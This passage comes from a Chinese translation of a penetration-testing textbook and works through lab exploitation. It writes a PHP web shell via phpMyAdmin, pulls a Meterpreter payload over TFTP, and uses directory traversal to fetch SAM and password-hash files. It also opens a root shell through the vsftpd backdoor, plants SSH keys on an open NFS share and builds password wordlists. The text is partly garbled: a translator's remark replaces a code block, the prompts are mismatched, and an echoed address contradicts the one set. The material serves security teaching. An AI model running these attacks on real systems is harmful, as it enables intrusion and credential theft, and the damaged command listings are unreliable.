  \n在 Msfconsole 中使用 `multi/handler`，将 payload 设置为 `php/meterpreter/reverse_tcp` ❶，并适当设置\
  \ `LHOST` ❷ 和 `LPORT` ❸ 以匹配生成的 payload。如果你对此过程不熟悉，请跳回到使用 Msfvenom 创建独立 payload。\n\
  \n通过在 Web 浏览器中打开已上传的 payload，应该会为我们提供一个 Meterpreter 会话，当我们回到 Msfconsole 时可以看到它，如下所示：\n\
  \n```\n[*] Sending stage (39217 bytes) to 192.168.20.10\n[*] Meterpreter session\
  \ 2 opened (192.168.20.9:2323 -> 192.168.20.10:1301) at 2015-01-07 17:27:44 -0500\n\
  \nmeterpreter >\n```\n\n我们可以使用 Meterpreter 命令 `getuid` 来查看会话在被攻击目标上拥有何种权限。通常情况下，我们获得的是所利用软件的权限。\n\
  \n```\nmeterpreter > getuid\nBOOKXP\\SYSTEM\n```\n\n我们现在拥有了系统权限，这将允许我们完全控制 Windows\
  \ 系统。（正因为这个原因，允许 Web 服务器软件拥有系统权限通常是一个很坏主意。因为 XAMPP 的 Apache 服务器作为系统服务运行，我们对底层系统完全完全权限。）\n\
  \n现在让我们来看 XAMPP 安装的另一个问题。\n\n### 攻击开放的 phpMyAdmin\n\n在上一节中利用的相同 XAMPP 平台也包含一个开放的\
  \ phpMyAdmin 安装，我们可以利用它在数据库服务器上运行命令。与 Apache 类似，我们的 MySQL 服务器将具有系统权限（如果是作为 Windows\
  \ 服务安装的）或启动 MySQL 进程的用户权限。通过访问 MySQL 数据库，我们可以进行类似于之前的 WebDAV 攻击的攻击，并使用 MySQL 查询将脚本上传到\
  \ Web 服务器。\n\n要探索这种攻击，首先导航到 `[`192.168.20.10/phpmyadmin`](http://192.168.20.10/phpmyadmin)`，点击顶部的\
  \ SQL 选项卡。我们将使用 MySQL 为 Web 服务器编写一个脚本，用它来获取远程 shell。我们将使用 SQL `SELECT` 语句将 PHP 脚本输出到\
  \ Web 服务器上的文件中，这将允许我们远程控制目标系统。我们将使用脚本 `<?php system($_GET['cmd']); ?>` 来从 URL 中抓取\
  \ `cmd` 参数并使用 `system()` 命令执行它。\n\nWindows 上 XAMPP 的 Apache 默认安装位置为 `C:\\xampp\\\
  htodcs\\*`。我们命令的语法为：`SELECT \"``<script string>`\"`into outfile \"``path_to_file_on_web_server`\"\
  \"。我们完成的命令看起来如下：\n\n```\nSELECT \"<?php system($_GET['cmd']); ?>\" into outfile\
  \ \"C:\\\\xampp\\\\htdocs\\\\shell.php\"\n```\n\n### 注意\n\n我们使用双反斜杠进行转义，这样就不会产生路径\
  \ `C:xampphtdocsshell.php` 的文件，否则我们无法从 Web 服务器访问它。\n\n图 8-2 显示了在 phpMyAdmin 的 SQL\
  \ 控制台中输入的命令。\n\n![Executing SQL commands](img/httpatomoreillycomsourcenostarchimages2030388.png.jpg)图\
  \ 8-2. 执行 SQL 命令\n\n在 phpMyAdmin 中运行该完成的查询，然后浏览到新创建的文件 `[`192.168.20.10/shell.php`](http://192.168.20.10/shell.php)`。脚本应该抛错误\
  \ `Warning: system() [function.system]: Cannot execute a blank command in C:\\xampp\\\
  htdocs\\shell.php on line 1`，因为我们没有提供 `cmd` 参数。（回想之前，`shell.php` 从 URL 中抓取 `cmd`\
  \ 参数并使用 PHP `system()` 命令运行它。）我们需要提供一个 `cmd` 参数，告诉脚本我们想在目标系统上运行的命令。例如，我们可以要求 Windows\
  \ XP 目标使用 `ipconfig` 作为 `cmd` 参数告诉我们它的网络信息，如下所示：\n\n```\nhttp://192.168.20.10/shell.php?cmd=ipconfig\n\
  ```\n\n结果所示图 8-3。\n\n![Code execution](img/httpatomoreillycomsourcenostarchimages2030390.png.jpg)图\
  \ 8-3. 代码执行\n\n### 使用 TFTP 下载文件\n\n之前的步骤为我们提供了具有系统权限的 shell，我们通过上传一个更复杂的 PHP 脚本来“升级”它。但与其创建一个长且复杂的\
  \ SQL `SELECT` 查询，我们可以在我们的 Kali 机器上托管文件，然后使用我们的 PHP shell 将其拉取。在 Linux 上，我们可以使用\
  \ `wget` 从命令行下载文件。这种功能在 Windows 上缺失，但我们可以在 Windows 上使用 TFTP。让我们用它上传上一节的 `meterpreter.php`。\n\
  \n### 注意\n\nTFTP 不是我们非交互式命令行传输文件的唯一方法。事实上，较新的 Windows 系统默认未启用 TFTP。你也可以使用 `-s` 让\
  \ FTP 读取文件，或者在最新的 Windows 系统上使用脚本语言如 Visual Basic 或 Powershell。\n\n我们可以使用 Atftpd\
  \ TFTP 服务器在我们的 Kali 系统上托管文件。以守护模式启动 Atftpd，从 `meterpreter.php` 脚本所在的位置提供服务。\n\n\
  ```\nroot@kali:~# atftpd --daemon --bind-address 192.168.20.9 /tmp\n```\n\n在 `shell.php`\
  \ 脚本设置 `cmd` 参数如下：\n\n```\nhttp://192.168.20.10/shell.php?cmd=tftp 192.168.20.9\
  \ get meterpreter.php\nC:\\\\xampp\\\\htdocs\\\\meterpreter.php\n```\n\n该命令应该通过\
  \ TFTP 将 `meterpreter.php` 拉取目标的 Apache 目录，如图 8-4 所示。\n\n![Transferring files with\
  \ TFTP](img/httpatomoreillycomsourcenostarchimages2030392.png)图 8-4. 使用 TFTP 传输文件\n\
  \n现在我们可以访问 `[`192.168.20.10/meterpreter.php`](http://192.168.20.10/meterpreter.php)\
  \ 来打开一个 Meterpreter shell。（请确保在执行脚本之前重新启动 handler 以拦截 Meterpreter 连接。）\n\n\n\n\n\
  这并不是我们利用数据库访问的唯一方法。例如，如果你发现的是微软 MS SQL 数据库，你可能可以使用 `xp_cmdshell()` 函数，它充当内置的系统命令壳程序。出于安全考虑，它在较新版本的\
  \ MS SQL 中被禁用了，但具有管理员权限的用户应该能够重新启用它，让你在无需上传任何内容的情况下获得 shell 访问权限。\n\n## 下载敏感文件\n\
  \n回想 第 6 章，我们在端口 `3232` 上运行的 Zervit 服务器存在目录穿越漏洞，这允许我们在无需身份验证的情况下从远程系统下载文件。我们可以通过以下\
  \ URL 使用浏览器下载 Windows `boot.ini` 配置文件（以及其他文件）：\n\n```\nhttp://192.168.20.10:3232/index.html?../../../../../../boot.ini\n\
  ```\n\n我们将利用这种能力获取包含 Windows 密码哈希（加密后的密码）的文件以及已安装的服务。\n\n### 下载配置文件\n\nXAMPP 的默认安装位置是\
  \ `C:\\xampp`，因此我们可以预计 FileZilla FTP 服务器目录位于 `C:\\xampp\\FileZillaFtp`。对 FileZilla\
  \ 的少量在线研究告诉我们，它在 `FileZilla Server.xml` 配置文件中存储密码的 MD5 哈希。根据文件中存储的 FTP 密码的强度，我们可能可以使用\
  \ MD5 哈希值恢复用户的明文 FTP 密码。\n\n我们在 第 7 章 中获取了用户 `georgia` 的密码，但我们的目标可能包含额外的账户。让我们使用\
  \ Zervit 服务器从 `[`192.168.20.10:3232/index.html?../../../../../../xampp/FileZillaFtp/FileZilla%20\
  \ Server.xml`](http://192.168.20.10:3232/index.html?../../../../../../xampp/FileZillaFtp/FileZilla%20\
  \ Server.xml)` 下载 FileZilla 配置文件。（注意 %20 是空格的十六进制）。你可以在 示例 8-4 中看到文件的某些内容。\n\n示例\
  \ 8-4. FileZilla FTP 配置文件\n\n```\n<User Name=\"georgia\">\n<Option Name=\"Pass\"\
  >5f4dcc3b5aa765d61d8327deb882cf99</Option>\n<Option Name=\"Group\"/>\n<Option Name=\"\
  Bypass server userlimit\">0</Option>\n<Option Name=\"User Limit\">0</Option>\n<Option\
  \ Name=\"IP Limit\">0</Option>\n--snip--\n```\n\n如你所示，配置文件包含两个用户账户（在 User Name 字段中）：`georgia`\
  \ 和 `newuser`。现在我们要做的只是根据存储的哈希推算出它们的密码。\n\n我们将在下一章中介绍如何将密码哈希转换回明文密码（包括 MD5 哈希）。\n\
  \n### 下载 Windows SAM\n\n提到密码，除了 FTP 用户密码外，我们还可以尝试下载存储 Windows 哈希的 `Windows 安全账户管理器\
  \ (SAM)` 文件。SAM 文件经过了混淆处理，因为 Windows Syskey 工具使用 128 位 Rivest Cipher 4 (RC4) 加密\
  \ SAM 文件内部的密码哈希以提供额外的安全性。即使攻击者或渗透人员能够获取 SAM 文件，恢复密码哈希还需要多做一些工作。我们需要一个密钥来逆转哈希的 RC4\
  \ 加密。Syskey 工具的加密密钥称为 `bootkey`，存储在 Windows SYSTEM 文件中。我们需要同时下载 SAM 和 SYSTEM 文件来恢复哈希并尝试将它们逆转为明文密码。在\
  \ Windows XP 中，这些文件位于 `C:\\Windows\\System32\\config`，因此让我们尝试从以下 URL 下载 SAM 文件：\n\
  \n```\nhttp://192.168.20.10:3232/index.html?../../../../../../WINDOWS/system32/config/sam\n\
  ```\n\n当我们尝试使用 Zervit 下载此文件时，收到了“找不到文件”的错误。看起来我们的 Zervit 服务器没有访问该权限。幸运的是，Windows\
  \ XP 将 SAM 和 SYSTEM 文件都备份到了 `C:\\Windows\\repair` 目录，如果我们尝试从那里获取文件，Zervit 就能提供它们。这些\
  \ URL 应该可以起作用：\n\n```\nhttp://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/system\n\
  http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/sam\n```\n\
  \n### 注意事项\n\n与我们的 MD5 哈希一样，在下一章深入讲解密码攻击时，我们将使用 Windows SAM 文件。\n\n## 利用第三方软件中的缓冲区溢出\n\
  \n在 第 6 章 中，我们从未确定 Windows XP 目标上的 SLMail 服务器是否受到 POP3  `CVE-2003-0264` 的影响。SLMail\
  \ 报告的版本号 (5.5) 似乎与漏洞相符，因此让我们尝试利用它。相应的 Metasploit 模块 `windows/pop3/seattlelab_pass`\
  \ 评级为 `great`。（如此高的评级如果失败，不太可能导致服务崩溃）。\n\n`windows/pop3/seattlelab_pass` 尝试利用 POP3\
  \ 服务器中的缓冲区溢出。使用它类似于设置 MS08-067 漏洞，如 示例 8-5 所示。\n\n示例 8-5. 使用 Metasploit 利用 SLMail\
  \ 5.5 POP3\n\n```\nmsf > use windows/pop3/seattlelab_pass\nmsf  exploit(seattlelab_pass)\
  \ > show payloads\n\nCompatible Payloads\n===================\n\n   Name       \
  \                                  Disclosure Date  Rank\n   ----              \
  \                           ---------------    -----------\n   generic/custom  \
  \                               normal\n   /debug_trap                         \
  \           normal\n```\n\n（此处省略重复的 msf 代码块，已按要求处理翻译）\n\n\n\n\n```\nmsf  exploit(seattlelab_pass)\
  \ > search tikiwiki\n```\n\n## 匹配模块\n\n```Name                                 \
  \           Disclosure Date         Rank      Description\n   ----             \
  \                               ---------------         ----      -----------\n\
  \   --snip--\n  ❶exploit/unix/webapp/tikiwiki_graph_formula_exec 2007-10-10 00:00:00\
  \ UTC excellent TikiWiki graph_\n                                              \
  \                                         formula Remote\n                     \
  \                                                                  PHP Code\n  \
  \                                                                              \
  \       Execution\n   exploit/unix/webapp/tikiwiki_jhot_exec          2006-09-02\
  \ 00:00:00 UTC excellent TikiWiki jhot\n                                       \
  \                                                Remote Command\n              \
  \                                                                         Execution\n\
  --snip--\n\n```\n```\nmsf  exploit(seattlelab_pass) > info unix/webapp/tikiwiki_graph_formula_exec\n\
  ```\n       Name: TikiWiki tiki-graph_formula Remote PHP Code Execution\n     Module:\
  \ exploit/unix/webapp/tikiwiki_graph_formula_exec\n  --snip--\n  TikiWiki (<= 1.9.8)\
  \ contains a flaw that may allow a remote attacker\n  to execute arbitrary PHP code.\
  \ The issue is due to\n  'tiki-graph_formula.php' script not properly sanitizing\
  \ user input\n  supplied to `create_function()`, which may allow a remote attacker\
  \ to\n  execute arbitrary PHP code resulting in a loss of integrity.\n\nReferences:\n\
  \  http://cve.mitre.org/cgi-bin/cvename.cgi?name=2007-5423\n  http://www.osvdb.org/40478❷\n\
  \  http://www.securityfocus.com/bid/26006\n```\n\n根据模块名称，`unix/webapp/tikiwiki_graph_formula_exec`\
  \ ❶ 看起来像是我们需要的，因为它的名称中包含了 `graph_formula`。当我们对该模块运行 `info` 命令时，我们的假设得到了证实。`unix/webapp/tikiwiki_graph_formula_exec`\
  \ 参考文献中列出的 OSVDB 编号 ❷ 与我们在第 6 章中获得的 Nikto 输出匹配。\n\n该模块的选项与我们之前的漏洞示例不同，如示例 8-7 所示。\n\
  \n### 示例 8-7. 使用 TikiWiki 漏洞\n\n```\nmsf  exploit(seattlelab_pass) > use unix/webapp/tikiwiki_graph_formula_exec\n\
  msf  exploit(tikiwiki_graph_formula_exec) > show options\n\nModule options (exploit/unix/webapp/tikiwiki_graph_formula_exec):\n\
  \n   Name     Current Setting  Required  Description\n   ----     ---------------\
  \  --------  -----------\n   Proxies                   no        使用代理链 ❶\n   RHOST\
  \                     yes       目标地址\n   RPORT    80               yes       目标端口\n\
  \   URI      /tikiwiki        yes       TikiWiki 目录路径❷\n   VHOST               \
  \      no        HTTP 服务器虚拟主机 ❸\n\nExploit target:\n\n   Id  Name\n   --  ----\n\
  \   0   Automatic\n\nmsf  exploit(tikiwiki_graph_formula_exec) > set RHOST 192.168.20.11\n\
  RHOST => 192.168.20.11\n```\n\n我们可以为 TikiWiki 服务器设置代理链 ❶ 和/或虚拟主机 ❸，但我们在这里不需要。我们可以让\
  \ `URI` 保持默认位置 `/tikiwiki` ❷。\n\n此漏洞涉及 PHP 命令执行，因此我们的负载（payloads）自然是基于 PHP 的。使用\
  \ `show payloads` 命令（示例 8-8）可以发现，我们可以像在 XAMPP 漏洞利用中那样，使用基于 PHP 的 Meterpreter ❶。我们还需要再次设置\
  \ `LHOST` 选项 ❷。\n\n### 示例 8-8. 使用 Metasploit 攻击 TikiWiki\n\n```\n\nmsf  exploit(tikiwiki_graph_formula_exec)\
  \ > set payload php/meterpreter/reverse_tcp❶\npayload => php/meterpreter/reverse_tcp\n\
  \nmsf  exploit(tikiwiki_graph_formula_exec) > set LHOST 192.168.20.9❷\nLHOST =>\
  \ 192.168.20.110\nmsf  exploit(tikiwiki_graph_formula_exec) > exploit\n\n[*] Started\
  \ reverse handler on 192.168.20.9:4444\n[*] Attempting to obtain database credentials...\n\
  [*] The server returned            : 200 OK\n[*] Server version                \
  \ : Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch\n[*] TikiWiki\
  \ database informations :\n\ndb_tiki   : mysql\ndbversion : 1.9\nhost_tiki : localhost\n\
  user_tiki : tiki❸\npass_tiki : tikipassword\ndbs_tiki  : tikiwiki\n\n[*] Attempting\
  \ to execute our payload...\n[*] Sending stage (39217 bytes) to 192.168.20.11\n\
  [*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.11:54324) at 2015-01-07\
  \ 20:41:53 -0500\n\nmeterpreter >\n```\n\n如你所见，在攻击 TikiWiki 安装时，Metasploit 模块发现了\
  \ TikiWiki 数据库的凭据 ❸。遗憾的是，MySQL 服务器没有在网络上，因此这些凭据无法用于进一步渗透。尽管如此，我们仍然应该记录它们，因为它们在后渗透阶段可能会很有用。\n\
  \n## 攻击被攻破的服务\n\n我们在第 6 章 中提到，Linux 目标上的 FTP 服务器显示的是 Very Secure FTP 2.3.4 的横幅，该版本已被一个包含后门的二进制文件所替换。由于\
  \ Vsftpd 的作者最终恢复了官方代码，发现我们的 Linux 目标服务器是否存在后门代码的唯一方法是进行测试。（我们不需要担心在没有漏洞时可能导致服务崩溃：如果此服务器没有后门代码，当我们使用笑脸符号时，只会得到登录错误。）\n\
  \n输入你喜欢的任何用户名，并在最后添加 `:)`（参见示例 8-9）。密码也可以使用任何内容。如果存在后门，它将在没有有效凭据的情况下触发。\n\n### 示例\
  \ 8-9. 触发 Vsftpd 后门\n\n```\nroot@kali:~# ftp 192.168.20.11\nConnected to 192.168.20.11.\n\
  220 (vsFTPd 2.3.4)\nName (192.168.20.11:root): georgia:)\n331 Please specify the\
  \ password.\nPassword:\n```\n\n我们注意到登录在输入密码后挂起了。这告诉我们 FTP 服务器仍在处理我们的登录尝试，如果再次查询\
  \ FTP 端口，它将继续响应。让我们使用 Netcat 尝试连接到 6200 端口，如果存在后门，那里将生成一个 root shell。\n\n```\nroot@kali:~#\
  \ nc 192.168.20.11 6200\n# whoami\nroot\n```\n\n果然，我们获得了一个 root shell。root 权限让我们对目标机器拥有完全控制权。例如，我们可以使用\
  \ `cat /etc/shadow` 命令获取系统密码哈希值。将用户 `georgia` 的密码哈希（`georgia:$1$CNp3mty6$|RWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::\
  \ `）保存到名为 `linuxpasswords.txt` 的文件中。我们将在第 9 章](#ch09.html \"第 9 章 密码攻击\") 中尝试将此哈希转换为明文密码。\n\
  \n## 攻击开放的 NFS 共享\n\n此时我们知道 Linux 目标通过 NFS 导出了用户 *georgia* 的家目录，并且该共享无需凭据即可访问。但如果我们无法利用访问权限读取或写入敏感文件，这可能不会带来很大的安全风险。\n\
  \n回想我们在第 6 章 中扫描 NFS 挂载时，看到了 *.ssh* 目录。该目录可能包含用户的私 SSH 密钥以及用于 SSH 身份验证的密钥。让我们看看能否攻击此共享。首先在你的\
  \ Kali 系统上挂载 NFS 共享。\n\n```\nroot@kali:~# mkdir /tmp/mount\nroot@kali:~# mount -t\
  \ nfs -o nolock 192.168.20.11:/export/georgia /tmp/mount\n```\n\n乍看之下这没什么希望，因为 *georgia*\
  \ 没有文档、图片或视频——只有我们将在第 16 章](#ch16.html \"第 16 章 Linux 中的栈缓冲区溢出\") 中使用的简单缓冲区溢出示例。这里似乎没有敏感信息，但在得出结论之前，让我们看看\
  \ *.ssh* 目录里有什么。\n\n\n\n\n\n```\nroot@kali:~# cd /tmp/mount/.ssh\nroot@kali:/tmp/mount/.ssh#\
  \ ls\nauthorized_keys  id_rsa  id_rsa.pub\n```\n\n我们现在已经可以访问 `georgia` 的 SSH 密钥。`id_rsa`\
  \ 文件是她的私钥，`id_rsa.pub` 是她对应的公钥。我们可以读取甚至修改这些值，并且向 SSH 文件 `authorized_keys` 写入内容，该文件处理了一个允许作为用户\
  \ `georgia` 登录的 SSH 公钥列表。由于我们拥有写入权限，我们可以在这里添加自己的密钥，这样我们就可以在以 `georgia` 身份登录 Ubuntu\
  \ 目标系统时跳过密码验证，如示例 8-10 所示。\n\n### 示例 8-10. 生成新的 SSH 密钥对\n\n```\nroot@kali:~# ssh-keygen\n\
  Generating public/private rsa key pair.\nEnter file in which to save the key (/root/.ssh/id_rsa):\n\
  Enter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour\
  \ identification has been saved in /root/.ssh/id_rsa.\nYour public key has been\
  \ saved in /root/.ssh/id_rsa.pub.\nThe key fingerprint is:\n26:c9:b7:94:8e:3e:d5:04:83:48:91:d9:80:ec:3f:39\
  \ root@kali\nThe key's randomart image is:\n+--[ RSA 2048]----+\n| . o+B .     \
  \    |\n--snip--\n+-----------------+\n```\n\n首先，我们在自己的 Kali 机器上使用 `ssh-keygen`\
  \ 生成一个密钥。默认情况下，我们的新公钥被写入 `/root/.ssh/id_rsa.pub`，私钥被写入 `/root/.ssh/id_rsa`。我们想要将公钥添加到\
  \ Ubuntu 上 `georgia` 的 `authorized_keys` 文件中。\n\n接下来，让我们将新生成的公钥追加到 `georgia` 的 `authorized_keys`\
  \ 文件中。使用 `cat` 输出 `/root/.ssh/id_rsa.pub` 的内容，并将其追加到 `georgia` 的 `authorized_keys`\
  \ 文件中。\n\n```\nroot@kali:~# cat ~/.ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys\n\
  ```\n\n现在我们应该可以以 `georgia` 身份 SSH 登录 Linux 目标了。让我们尝试一下。\n\n```\nroot@kali:~# ssh\
  \ georgia@192.168.20.11\ngeorgia@ubuntu:~$\n```\n\n运行得很好。我们现在可以使用公钥认证成功地通过 Linux\
  \ 目标系统。\n\n我们也可以通过将 `georgia` 的密钥复制到 Kali 机器来获取访问权限。为此，我们首先删除创建的 SSH 身份。\n\n```\n\
  root@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa.pub\nroot@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa\n\
  ```\n\n现在，我们将 `georgia` 的私钥 (`id_rsa`) 和公钥 (`id_rsa.pub`) 复制到 Kali 上 root 的 `.ssh`\
  \ 目录，并在尝试 SSH 登录 Linux 目标之前使用 `ssh-add` 命令将该身份添加到认证代理中。\n\n```\nroot@kali:/tmp/mount/.ssh#\
  \ cp id_rsa.pub ~/.ssh/id_rsa.pub\nroot@kali:/tmp/mount/.ssh# cp id_rsa ~/.ssh/id_rsa\n\
  root@kali:/tmp/mount/.ssh# ssh-add\nIdentity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\n\
  root@kali:/tmp/mount/.ssh# ssh georgia@192.168.20.11\nLinux ubuntu 2.6.27-7-generic\
  \ #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686\ngeorgia@ubuntu:~$\n```\n\n再次，我们能够通过操纵\
  \ SSH 密钥获取目标的访问权限。我们从能够读写 `georgia` 主目录下的文件开始。现在我们不需要密码就可以以 `georgia` 用户身份在 Linux\
  \ 系统上获得一个 shell。\n\n## 总结\n\n在本章中，我们能够将在第 5 章中收集的信息与在第 6 章中发现的漏洞相结合，对 Windows XP\
  \ 和 Linux 目标实现了多次攻破。我们使用了多种技术，包括攻击配置错误的 Web 服务器、利用带有后门的软件搭便车、利用敏感文件的访问控制不当、利用底层系统的漏洞以及利用第三方软件中的问题。\n\
  \n既然我们已经成功在系统中建立了立脚点，在下一章中，让我们转向破解在系统中找到的密码。\n\n## 第 9 章 密码攻击\n\n在渗透测试任务中，密码通常是阻力最小的路径。拥有强大安全计划客户可以修复缺失的\
  \ Windows 补丁和过时的软件，但用户本身是无法被“修复”的。当我们在第 11 章中讨论社会工程时，我们会查看攻击用户，但如果我们能正确猜测或计算出用户的密码，我们可能完全避免让用户参与攻击。在本章中，我们将研究如何使用工具自动运行目标上的服务并发送用户名和密码。此外，我们还将学习破解在第\
  \ 8 章中获取的密码哈希值。\n\n## 密码管理\n\n公司开始意识到基于密码认证的固有风险；暴力破解和有理猜测对于弱密码都是严重风险。许多组织使用生物识别（基于指纹或视网膜扫描）或双因素认证来降低这些风险。即使是\
  \ Gmail 和 Dropbox 等 Web 服务也提供双因素认证，用户需要提供密码以及第二个值（例如电子令牌上的数字）。如果没有可用的双因素认证，使用强密码对于账户安全是至关重要的，因为在攻击者和敏感数据之间的屏障可能取决于一个简单的字符串。强密码是长的，使用了多个复杂度类别的字符，并且不是基于字典单词。\n\
  \n我们在书中使用的密码故意写得很糟糕，但遗憾的是，许多用户在密码方面的表现并不好多少。组织可以强制用户创建强密码，但随着密码变得复杂，它们变得更难记忆。用户可能会把记不住的密码写在电脑的文件、智能手机中，甚至是便签纸上，因为这样更容易记录。当然，那些在随处以明文形式可能被发现的密码会破坏使用强密码的安全性。\n\
  \n良好密码管理的另一个大忌是在许多网站上使用相同的密码。在最坏的情况下，CEO 在被攻破的网络论坛上使用的弱密码可能与他访问公司财务文档的密码相同。在执行密码攻击时要考虑到密码重复使用的问题；你可能会发现同一个密码在多个系统和网站上有效。\n\
  \n密码管理为 IT 人员提出了一个棘手的问题，除非直到基于密码的认证完全被淘汰并转向另一种模型，否则它可能继续是攻击者得心应手的途径。\n\n## 在线密码攻击\n\
  \n正如我们使用自动扫描来发现漏洞一样，我们可以脚本自动尝试登录服务并寻找有效的凭据。我们将使用设计用于自动化在线密码攻击或猜测密码直到服务器返回登录成功的工具。这些工具使用一种名为“暴力破解”（brute\
  \ forcing）的技术。使用暴力破解的工具会尝试所有可能的用户名和密码组合，在时间足够的情况下，它们*将会*找到有效的凭据。\n\n暴力破解的问题在于，随着强密码的使用，破解它们所需的时间从几小时变为数年，甚至超过你的自然寿命。通过向自动登录工具中输入关于正确密码的有理猜测，我们更容易找到可用的凭据。字典单词很容易记忆，因此尽管有安全警告，许多用户仍将其包含在密码中。稍微有点安全意识的用户可能会在密码末尾加上数字，甚至可能加一个感叹号。\n\
  \n### 字典列表\n\n\n\n\n\n在使用工具猜解密码之前，你需要一个用于尝试的凭据列表。如果你不知道想要破解的用户账户名称，或者只是想破解尽可能多的账户，可以提供一个用户名列表供密码猜解工具进行迭代。\n\
  \n### 用户列表\n\n在创建用户列表时，首先尝试确定客户端的用户名命名方案。例如，如果我们正尝试破解员工的电子邮箱账户，请弄清楚电子邮件地址遵循的模式。它们是\
  \ `firstname.lastname`、仅有名字，还是其他什么？\n\n你可以在常见名字或姓氏的列表中寻找良好的用户名候选者。当然，如果你能找到目标实际员工的名字，猜解成功的概率会更高。如果一家公司使用名字首字母加姓氏的方案作为命名方案，且他们有一位名为\
  \ John Smith 的员工，那么 `jsmith` 可能是一个有效的用户名。示例 9-1 了一个了一个非常短的示例用户列表。在实际的任务中，你可能需要一个更大的用户列表。\n\
  \n示例 9-1. 示例用户列表\n\n```\nroot@kali:~# cat userlist.txt\ngeorgia\njohn\nmom\njames\n\
  ```\n\n一旦你创建了列表，请将示例用户名保存到 Kali Linux 中的一个文本文件中，如示例 9-1 所示。你将使用此列表在使用 Hydra 猜解用户名和密码中执行在线密码攻击。\n\
  \n#### 密码列表\n\n除了可能的用户列表，我们还需要密码列表，如示例 9-2 所示。\n\n示例 9-2. 示例密码列表\n\n```\nroot@kali:~#\
  \ cat passwordfile.txt\npassword\nPassword\npassword1\nPassword1\nPassword123\n\
  password123\n```\n\n和用户名列表一样，这个密码列表只是一个非常短的示例（希望在现实世界中不会为太多账户找到正确的密码）。在实际的任务中，你应该使用长得多的字典。\n\
  \n互联网上有许多优秀的密码列表。寻找字典列表的好地方包括 `[http://packetstormsecurity.com/Crackers/wordlists/]`\
  \ 和 `[http://www.openwall.com/wordlists/]`。Kali Linux 中也内置了一些密码列表。例如，`/usr/share/wordlists`\
  \ 目录包含一个名为 `rockyou.txt.gz` 的文件。这是一个压缩的字典。如果你使用 Linux 工具 `gunzip` 解压缩该文件，你将拥有约 140\
  \ MB 的可能密码，这应该给你一个非常不错的起点。此外，Kali 中的一些密码破解工具也带有示例字典。例如，John the Ripper 工具（我们将在离线密码攻击中使用）包含一个位于\
  \ `/usr/share/john/password.lst` 的字典。\n\n为了获得更好的结果，可以通过包含额外的单词来针对特定目标自定义你的字典。你可以根据在网上收集的关于员工的信息进行合理的推测。关于配偶、孩子、宠物和爱好的信息可能会引导你进入正确的方向。例如，如果你的目标\
  \ CEO 是社交媒体上 Taylor Swift 的忠实粉丝，考虑添加与她的专辑、音乐或男朋友相关的关键词。如果你的目标密码是 `TaylorSwift13!`，你完全应该在运行整个预编译字典或暴力破解尝试之前，通过密码猜解确认它。另一个需要记住的点是目标使用的语言。\n\
  \n除了根据在执行侦察期间收集的信息进行合理推测外，像 `ceWL` 自定义字典生成器这样的工具会搜索公司网站添加到你的字典中的单词。示例 9-3 显示了你如何使用\
  \ `ceWL` 根据 `[www.bulbsecurity.com]` 的内容创建一个字典。\n\n示例 9-3. 使用 ceWL 构建自定义字典\n\n```\n\
  root@kali:~# cewl --help\ncewl 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)\n\
  \nUsage: cewl [OPTION] ... URL\n--snip--\n--depth x, -d x: 爬虫深度，默认为 2 ❶\n--min_word_length,\
  \ -m: 最小单词长度，默认为 3 ❷\n--offsite, -o: 让爬虫访问其他网站\n--write, -w file: 将输出写入文件 ❸\n--ua,\
  \ -u user-agent: 发送的 user-agent\n--snip--\nURL: 要爬取的站点。\nroot@kali:~# cewl -w bulbwords.txt\
  \ -d 1 -m 5 www.bulbsecurity.com ❹\n```\n\n命令 `ceWL --help` 列出了 `ceWL` 的用法。使用 `-d`（深度）选项\
  \ ❶ 指定 `ceWL` 应在目标网站上跟踪多少链接。如果你认为目标有最小密码大小限制，你可以指定最小单词长度以匹配 `-m` 选项 ❷。一旦做出选择，使用\
  \ `-w` 选项 ❸ 将 `ceWL` 的结果输出到文件。例如，要搜索 `[www.bulbsecurity.com]` 深度为 1，最小单词长度为 5 个字符并将找到的单词输出到文件\
  \ `bulbwords.txt`，你需要使用❹ 所示的命令。生成的文件将包含网站上所有符合你要求的单词。\n\n创建字典的另一种方法是生成给定字符集的所有可能组合的列表，或者指定字符数量的每个字符组合列表。Kali\
  \ 中的 `Crunch` 工具将为你生成这些字符集。当然，可能性越多，所需的磁盘空间就越大。使用 `Crunch` 的一个简单示例见示例 9-4。\n\n示例\
  \ 9-4. 使用 Crunch 暴力破解密钥空间\n\n```\nroot@kali:~# crunch 7 7 AB\nCrunch will now generate\
  \ the following amount of data: 1024 bytes\n0 MB\n0 GB\n0 TB\n0 PB\nCrunch will\
  \ now generate the following number of lines: 128\nAAAAAAA\nAAAAAAB\n--snip--\n\
  ```\n\n此示例生成了字符 A 和 B 的所有可能的七位组合列表。一个更有用但大很多的示例是输入 `crunch 7 8`，它将生成长度在 7 到 8 个字符之间的字符串的所有可能的字符组合，使用默认的\
  \ `Crunch` 小写字母字符集。这种技术被称为*密钥空间暴力破解*。虽然在人的一生中尝试密码的每一个可能的字符组合是不可能的，但尝试特定的子集是可能的；例如，如果你知道客户端的密码策略要求密码至少为七个字符，尝试所有七位和八位密码可能会导致破解成功——即使是在那些少数不以字典单词为密码基础的用户中也是如此。\n\
  \n### 注意\n\n开发一个稳健的字典或一组字典是一个不断变化的过程。对于本章的练习，你可以使用我们在示例 9-2 中创建的短示例字典，但随着你在该领域的经验增加，你将开发出在客户任务中运行良好的复杂的列表。\n\
  \n现在让我们看看如何使用字典来猜解目标上运行的服务密码。\n\n### 使用 Hydra 猜解用户名和密码\n\n\n\n\n\n如果你有一组凭据并想在某个需要登录的运行服务上进行测试，你可以手动一个一个输入，也可以使用工具来自动化此过程。`Hydra`\
  \ 是一款在线密码破解工具，可用于测试运行服务的用户名和密码。（遵循了安全工具以海拉克十二大力任务的受害者命名的传统，`Hydra` 的名字源自希腊神话中的多头蛇九头蛇）。示例\
